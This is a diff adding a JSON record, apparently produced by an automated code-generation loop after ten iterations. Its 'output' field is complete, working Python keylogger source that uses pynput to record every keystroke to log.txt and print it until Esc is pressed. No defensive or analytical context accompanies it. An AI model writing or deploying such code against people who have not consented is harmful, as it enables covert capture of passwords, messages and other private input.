@@ -1,0 +1,9 @@
+{
+  "output": "from pynput import keyboard\ndef on_key_press(key):\n    try:\n        with open('log.txt', 'a') as log_file:\n            log_file.write(key.char)\n            print(key.char)  # Debugging line\n    except AttributeError:\n        with open('log.txt', 'a') as log_file:\n            log_file.write(str(key))\n            print(str(key))  # Debugging line\ndef on_key_release(key):\n    if key == keyboard.Key.esc:\n        return False\nwith keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:\n    listener.join()",
+  "notes": "",
+  "applied_fixes": [
+    "iteration9_issue1",
+    "iteration9_issue2"
+  ],
+  "iterations": 10
+}
